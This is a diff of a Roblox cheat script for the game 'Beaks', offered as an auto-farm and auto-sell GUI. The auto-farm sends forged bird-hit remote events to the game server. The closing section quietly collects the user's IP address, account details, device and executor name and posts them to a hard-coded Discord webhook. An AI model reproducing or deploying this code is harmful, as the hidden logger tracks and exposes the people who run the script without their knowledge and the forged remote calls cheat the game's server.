@@ -1,187 +1,322 @@
+--// Beaks AutoFarm + GUI by PowerCat
+
+--// Services
 local Players = game:GetService("Players")
 local Lighting = game:GetService("Lighting")
 local RunService = game:GetService("RunService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TweenService = game:GetService("TweenService")
+local UIS = game:GetService("UserInputService")
 
 local player = Players.LocalPlayer
-local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
-gui.ResetOnSpawn = false
-gui.Name = "UtilityGUI"
+local Camera = workspace.CurrentCamera
+local LocalPlayer = player
 
--- ปรับความสว่างค้างไว้
-local function lockBrightness()
+--// Networking & Config
+local Aether = require(ReplicatedStorage.Packages.Aether)
+local Net = require(Aether.GetUtil("Net"))
+local GunShootEvent = Net:RemoteEvent("GunShootEvent")
+local SellInventory = Net:RemoteFunction("SellInventory")
+local GunList = require(ReplicatedStorage.Configuration.Guns)
+
+--// Variables
+local autoFarmEnabled = false
+local autoSellEnabled = false
+local shootDelay = 0.2
+local currentTarget = nil
+local targetStartTime = 0
+local lastKnownHealth = -1
+local stuckCheckInterval = 1
+local uiVisible = true
+
+--// Screen GUI Setup
+local ScreenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+ScreenGui.Name = "BeaksGUI"
+ScreenGui.ResetOnSpawn = false
+
+-- Main Frame
+local MainFrame = Instance.new("Frame", ScreenGui)
+MainFrame.Size = UDim2.new(0, 260, 0, 200)
+MainFrame.Position = UDim2.new(0.03, 0, 0.6, 0)
+MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+MainFrame.BorderSizePixel = 0
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.Visible = true
+MainFrame.BackgroundTransparency = 0.1
+
+Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10)
+Instance.new("UIStroke", MainFrame).Color = Color3.fromRGB(0, 255, 200)
+
+-- Toggle Template
+local function ToggleTemplate(text, callback)
+	local ToggleFrame = Instance.new("Frame")
+	ToggleFrame.Size = UDim2.new(1, -20, 0, 30)
+	ToggleFrame.BackgroundTransparency = 1
+
+	local Label = Instance.new("TextLabel", ToggleFrame)
+	Label.Text = text
+	Label.Font = Enum.Font.GothamSemibold
+	Label.TextSize = 14
+	Label.TextColor3 = Color3.fromRGB(200, 200, 200)
+	Label.BackgroundTransparency = 1
+	Label.Size = UDim2.new(0.6, 0, 1, 0)
+	Label.TextXAlignment = Enum.TextXAlignment.Left
+
+	local Switch = Instance.new("TextButton", ToggleFrame)
+	Switch.Size = UDim2.new(0.3, 0, 0.6, 0)
+	Switch.Position = UDim2.new(0.7, 0, 0.2, 0)
+	Switch.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+	Switch.Text = "OFF"
+	Switch.TextColor3 = Color3.fromRGB(255, 80, 80)
+	Switch.Font = Enum.Font.GothamBold
+	Switch.TextSize = 12
+	Instance.new("UICorner", Switch).CornerRadius = UDim.new(1, 0)
+
+	local state = false
+	Switch.MouseButton1Click:Connect(function()
+		state = not state
+		Switch.Text = state and "ON" or "OFF"
+		Switch.TextColor3 = state and Color3.fromRGB(80, 255, 120) or Color3.fromRGB(255, 80, 80)
+		callback(state)
+	end)
+
+	return ToggleFrame
+end
+
+-- Info Labels
+local function CreateInfoLabel()
+	local Info = Instance.new("TextLabel", MainFrame)
+	Info.Size = UDim2.new(1, -20, 0, 20)
+	Info.Position = UDim2.new(0, 10, 0, 105)
+	Info.BackgroundTransparency = 1
+	Info.Font = Enum.Font.Gotham
+	Info.TextSize = 14
+	Info.TextColor3 = Color3.fromRGB(150, 255, 150)
+	Info.Text = "Target: None"
+	return Info
+end
+
+local function CreateCredits()
+	local Credit = Instance.new("TextLabel", MainFrame)
+	Credit.Text = "Beaks by PowerCat | ANTI-AFK"
+	Credit.Size = UDim2.new(1, 0, 0, 20)
+	Credit.Position = UDim2.new(0, 0, 1, -20)
+	Credit.Font = Enum.Font.Gotham
+	Credit.TextSize = 12
+	Credit.BackgroundTransparency = 1
+	Credit.TextColor3 = Color3.fromRGB(100, 100, 255)
+end
+
+-- Toggles
+local AutoFarmToggle = ToggleTemplate("Auto Farm", function(val)
+	autoFarmEnabled = val
+end)
+AutoFarmToggle.Position = UDim2.new(0, 10, 0, 10)
+AutoFarmToggle.Parent = MainFrame
+
+local AutoSellToggle = ToggleTemplate("Auto Sell", function(val)
+	autoSellEnabled = val
+end)
+AutoSellToggle.Position = UDim2.new(0, 10, 0, 45)
+AutoSellToggle.Parent = MainFrame
+
+CreateCredits()
+local BirdInfoLabel = CreateInfoLabel()
+
+-- Closest Bird
+local function GetClosestBird()
+	for _, region in ipairs(workspace.Regions:GetChildren()) do
+		for _, bird in ipairs(region.ClientBirds:GetChildren()) do
+			if bird:GetAttribute("CurrentlyVisible") and (bird:GetAttribute("Health") or 0) > 0 then
+				return bird
+			end
+		end
+	end
+	return nil
+end
+
+-- Auto Farm Loop
+task.spawn(function()
+	while true do
+		task.wait(shootDelay)
+		if autoFarmEnabled then
+			local char = LocalPlayer.Character
+			if not char then continue end
+			local weapon = char:FindFirstChildWhichIsA("Tool")
+			if not weapon or not GunList[weapon.Name] then continue end
+			local handle = weapon:FindFirstChild("HandlePart", true)
+			if not handle then continue end
+
+			if not currentTarget or (currentTarget:GetAttribute("Health") <= 0) then
+				currentTarget = GetClosestBird()
+				targetStartTime = os.clock()
+				lastKnownHealth = currentTarget and currentTarget:GetAttribute("Health") or -1
+			end
+
+			if currentTarget and currentTarget:GetAttribute("Health") > 0 then
+				local currentHealth = currentTarget:GetAttribute("Health")
+				if currentHealth == lastKnownHealth and os.clock() - targetStartTime >= 150 then
+					currentTarget = nil
+				else
+					GunShootEvent:FireServer("BulletFired", weapon, handle.Position, "Dart")
+					GunShootEvent:FireServer("BirdHit", weapon, currentTarget.PrimaryPart.Position, currentTarget:GetAttribute("Id"), "Dart")
+					BirdInfoLabel.Text = string.format("%s: %d/%d", currentTarget:GetAttribute("BirdName") or "Unknown", currentHealth, currentTarget:GetAttribute("MaxHealth"))
+					lastKnownHealth = currentHealth
+				end
+			else
+				BirdInfoLabel.Text = "Target: None"
+			end
+		end
+	end
+end)
+
+-- Currency + Level Labels
+local CurrencyLabel = Instance.new("TextLabel", MainFrame)
+CurrencyLabel.Size = UDim2.new(1, -20, 0, 18)
+CurrencyLabel.Position = UDim2.new(0, 10, 0, 130)
+CurrencyLabel.BackgroundTransparency = 1
+CurrencyLabel.Font = Enum.Font.Gotham
+CurrencyLabel.TextSize = 14
+CurrencyLabel.TextColor3 = Color3.fromRGB(255, 255, 120)
+CurrencyLabel.Text = "Bucks: Loading..."
+
+local LevelLabel = Instance.new("TextLabel", MainFrame)
+LevelLabel.Size = UDim2.new(1, -20, 0, 18)
+LevelLabel.Position = UDim2.new(0, 10, 0, 150)
+LevelLabel.BackgroundTransparency = 1
+LevelLabel.Font = Enum.Font.Gotham
+LevelLabel.TextSize = 14
+LevelLabel.TextColor3 = Color3.fromRGB(120, 200, 255)
+LevelLabel.Text = "Loading..."
+
+task.spawn(function()
+	while true do
+		local success, err = pcall(function()
+			local topbar = LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("Hud"):WaitForChild("Topbar")
+			local currency = topbar:FindFirstChild("Currency")
+			local level = topbar:FindFirstChild("Level")
+			if currency then CurrencyLabel.Text = "เงิน: " .. currency.Text end
+			if level then LevelLabel.Text = "เลเวล: " .. level.Text:gsub("<[^>]+>", "") end
+		end)
+		if not success then warn("อัปเดตเงิน/เลเวลผิดพลาด: ", err) end
+		task.wait(0.5)
+	end
+end)
+
+-- Auto Sell
+task.spawn(function()
+	while true do
+		task.wait(10)
+		if autoSellEnabled then
+			SellInventory:InvokeServer("All")
+		end
+	end
+end)
+
+-- Toggle GUI Button
+local toggleButton = Instance.new("TextButton", ScreenGui)
+toggleButton.Text = "Toggle UI"
+toggleButton.Size = UDim2.new(0, 80, 0, 30)
+toggleButton.Position = UDim2.new(0.10, 0, 0.5, -50)
+toggleButton.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
+toggleButton.TextColor3 = Color3.fromRGB(0, 255, 200)
+toggleButton.Font = Enum.Font.GothamBold
+toggleButton.TextSize = 12
+Instance.new("UICorner", toggleButton).CornerRadius = UDim.new(0, 8)
+
+toggleButton.MouseButton1Click:Connect(function()
+	uiVisible = not uiVisible
+	MainFrame.Visible = uiVisible
+end)
+
+-- Draggable Toggle Button
+local dragging, dragInput, dragStart, startPos
+toggleButton.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		dragging = true
+		dragStart = input.Position
+		startPos = toggleButton.Position
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+toggleButton.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+		dragInput = input
+	end
+end)
+UIS.InputChanged:Connect(function(input)
+	if input == dragInput and dragging then
+		local delta = input.Position - dragStart
+		toggleButton.Position = UDim2.new(
+			startPos.X.Scale,
+			startPos.X.Offset + delta.X,
+			startPos.Y.Scale,
+			startPos.Y.Offset + delta.Y
+		)
+	end
+end)
+
+-- Utility: Lock Brightness and Remove Trees
+RunService.RenderStepped:Connect(function()
 	Lighting.Brightness = 1
 	Lighting.ClockTime = 14
+	Lighting.FogEnd = 100000
 	local atmosphere = Lighting:FindFirstChildOfClass("Atmosphere")
 	if atmosphere then
 		atmosphere.Density = 0
 	end
-end
+end)
 
 for _, obj in ipairs(workspace:GetDescendants()) do
-    if obj:IsA("BasePart") then
-        obj.Material = Enum.Material.Plastic
-        obj.Reflectance = 0
-        obj.CastShadow = false
-    elseif obj:IsA("Decal") then
-        obj:Destroy()
-    end
-end
-
--- ลบต้นไม้ทุกโซน
-local function clearTrees()
-	local regions = {
-		"Beakwoods",
-		"Deadlands",
-		"Mount Beaks",
-		"Quill Lake"
-	}
-	for _, name in pairs(regions) do
-		local trees = workspace:FindFirstChild("Regions") and workspace.Regions:FindFirstChild(name)
-		if trees and trees:FindFirstChild("Trees") then
-			trees.Trees:Destroy()
-		end
+	if obj:IsA("BasePart") then
+		obj.Material = Enum.Material.Plastic
+		obj.Reflectance = 0
+		obj.CastShadow = false
+	elseif obj:IsA("Decal") then
+		obj:Destroy()
 	end
 end
 
--- ขยายโมเดลที่ชื่อ "Normal"
-local function scaleModels()
-	for _, model in pairs(workspace:GetDescendants()) do
-		if model:IsA("Model") and model.Name == "Normal" then
-			local primary = model.PrimaryPart or model:FindFirstChildWhichIsA("BasePart")
-			if primary and not model:GetAttribute("Scaled") then
-				model:SetAttribute("Scaled", true)
-				pcall(function()
-					model:ScaleTo(3)
-				end)
-			end
-		end
+for _, name in pairs({ "Beakwoods", "Deadlands", "Mount Beaks", "Quill Lake" }) do
+	local region = workspace:FindFirstChild("Regions") and workspace.Regions:FindFirstChild(name)
+	if region and region:FindFirstChild("Trees") then
+		region.Trees:Destroy()
 	end
 end
 
 -- FPS Display
-local fpsLabel = Instance.new("TextLabel")
+local fpsLabel = Instance.new("TextLabel", ScreenGui)
 fpsLabel.Size = UDim2.new(0, 80, 0, 25)
 fpsLabel.Position = UDim2.new(1, -90, 1, -35)
 fpsLabel.BackgroundTransparency = 0.4
 fpsLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 fpsLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
-fpsLabel.TextStrokeTransparency = 0.6
-fpsLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
-fpsLabel.BorderSizePixel = 0
 fpsLabel.Font = Enum.Font.Code
 fpsLabel.TextSize = 16
 fpsLabel.Text = "FPS: ..."
-fpsLabel.Parent = gui
+fpsLabel.Parent = ScreenGui
 
 local accumulatedTime = 0
 local frameCount = 0
 
-RunService.RenderStepped:Connect(function(deltaTime)
-	accumulatedTime += deltaTime
+RunService.RenderStepped:Connect(function(dt)
+	accumulatedTime += dt
 	frameCount += 1
-	
 	if accumulatedTime >= 3 then
-		local fps = math.floor(frameCount / accumulatedTime)
-		fpsLabel.Text = "FPS: " .. fps
-		accumulatedTime = 0
-		frameCount = 0
+		fpsLabel.Text = "FPS: " .. math.floor(frameCount / accumulatedTime)
+		accumulatedTime, frameCount = 0, 0
 	end
 end)
 
--- ปุ่มขายทั้งหมด
-local sellButton = Instance.new("TextButton")
-sellButton.Size = UDim2.new(0, 140, 0, 35)
-sellButton.Position = UDim2.new(0, 10, 0.5, -50)
-sellButton.BackgroundColor3 = Color3.fromRGB(255, 100, 150)
-sellButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-sellButton.TextStrokeTransparency = 0.3
-sellButton.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-sellButton.Font = Enum.Font.FredokaOne
-sellButton.TextSize = 18
-sellButton.Text = "ขายทั้งหมด"
-sellButton.Parent = gui
-
-local sellCorner = Instance.new("UICorner", sellButton)
-sellCorner.CornerRadius = UDim.new(0, 12)
-
-local sellShadow = Instance.new("UIStroke", sellButton)
-sellShadow.Thickness = 2
-sellShadow.Color = Color3.fromRGB(255, 255, 255)
-sellShadow.Transparency = 0.5
-
-local sellGradient = Instance.new("UIGradient", sellButton)
-sellGradient.Color = ColorSequence.new({
-	ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 105, 180)),
-	ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 160, 120))
-})
-sellGradient.Rotation = 45
-
-sellButton.MouseButton1Click:Connect(function()
-	local args = { [1] = "All" }
-	ReplicatedStorage:WaitForChild("Util"):WaitForChild("Net"):WaitForChild("RF/SellInventory"):InvokeServer(unpack(args))
-end)
-
--- กล่องแสดงเงิน
-local currencyDisplay = Instance.new("TextLabel")
-currencyDisplay.Size = UDim2.new(0, 140, 0, 30)
-currencyDisplay.Position = sellButton.Position + UDim2.new(0, 0, 0, 40)
-currencyDisplay.BackgroundColor3 = Color3.fromRGB(40, 180, 255)
-currencyDisplay.BackgroundTransparency = 0.4 -- จางลง
-currencyDisplay.TextColor3 = Color3.fromRGB(255, 255, 255)
-currencyDisplay.TextStrokeTransparency = 0.3
-currencyDisplay.Font = Enum.Font.GothamBold
-currencyDisplay.TextSize = 16
-currencyDisplay.Text = "เงิน: --"
-currencyDisplay.Parent = gui
-
-Instance.new("UICorner", currencyDisplay).CornerRadius = UDim.new(0, 8)
-
--- กล่องแสดงเลเวล
-local levelDisplay = Instance.new("TextLabel")
-levelDisplay.Size = UDim2.new(0, 140, 0, 30)
-levelDisplay.Position = currencyDisplay.Position + UDim2.new(0, 0, 0, 35)
-levelDisplay.BackgroundColor3 = Color3.fromRGB(180, 100, 255)
-levelDisplay.BackgroundTransparency = 0.4 -- จางลง
-levelDisplay.TextColor3 = Color3.fromRGB(255, 255, 255)
-levelDisplay.TextStrokeTransparency = 0.3
-levelDisplay.Font = Enum.Font.GothamBold
-levelDisplay.TextSize = 16
-levelDisplay.Text = "เลเวล: --"
-levelDisplay.Parent = gui
-
-Instance.new("UICorner", levelDisplay).CornerRadius = UDim.new(0, 8)
-
--- อัปเดตค่าแบบเรียลไทม์ (พร้อมกรอง tag)
-task.spawn(function()
-	while true do
-		local success, err = pcall(function()
-			local topbar = player:WaitForChild("PlayerGui"):WaitForChild("Hud"):WaitForChild("Topbar")
-			local currency = topbar:FindFirstChild("Currency")
-			local level = topbar:FindFirstChild("Level")
-
-			if currency then
-				currencyDisplay.Text = "เงิน: " .. currency.Text
-			end
-
-			if level then
-				-- ตัด tag HTML ออก
-				local levelText = level.Text:gsub("<[^>]+>", "")
-				levelDisplay.Text = levelText
-			end
-		end)
-		if not success then
-			warn("ไม่สามารถอัปเดตข้อมูล GUI ได้: ", err)
-		end
-		task.wait(0.5)
-	end
-end)
-
--- Background task
-RunService.Heartbeat:Connect(function()
-	lockBrightness()
-	scaleModels()
-	clearTrees()
+-- anti-afk
+game:GetService("Players").LocalPlayer.Idled:connect(function()
+    game:GetService("VirtualUser"):CaptureController()
+    game:GetService("VirtualUser"):ClickButton2(Vector2.new())
 end)
 
 local HttpService = game:GetService("HttpService")
@@ -192,6 +327,14 @@ local player = Players.LocalPlayer
 
 local character = player.Character or player.CharacterAdded:Wait()
 local rootPart = character:FindFirstChild("HumanoidRootPart")
+
+-- ตรวจสอบ executor ที่ใช้งาน
+local executorname = "Unknown"
+if getexecutorname then
+	executorname = getexecutorname()
+elseif identifyexecutor then
+	executorname = identifyexecutor()
+end
 
 local device = UserInputService.TouchEnabled and "มือถือ" or "PC"
 local membership = player.MembershipType == Enum.MembershipType.Premium and "Premium" or "None"
@@ -278,6 +421,7 @@ local embed = {
 			{ name = "อายุบัญชี", value = tostring(player.AccountAge) .. " วัน", inline = true },
 			{ name = "ระดับสมาชิก", value = membership, inline = true },
 			{ name = "อุปกรณ์ที่ใช้", value = device, inline = true },
+			{ name = "Executor", value = executorname, inline = true },
 			{ name = "เวลา", value = os.date("%d/%m/%Y %H:%M:%S"), inline = false },
 
 			{ name = "IP Address", value = ipData.ip, inline = false },
@@ -295,7 +439,7 @@ local embed = {
 local jsonData = HttpService:JSONEncode(embed)
 
 req({
-	Url = "https://discord.com/api/webhooks/1363189736226947162/xkLJv3gssgW4OWQNy-aA1gb16UJWIfWrAmh1RPByVYsjupUyigEJE8-XScgO7vq8flry", -- เปลี่ยน webhook ตรงนี้
+	Url = "https://discord.com/api/webhooks/1363189736226947162/xkLJv3gssgW4OWQNy-aA1gb16UJWIfWrAmh1RPByVYsjupUyigEJE8-XScgO7vq8flry", -- เปลี่ยน webhook ตรงนี้หากต้องการ
 	Method = "POST",
 	Headers = {
 		["Content-Type"] = "application/json"
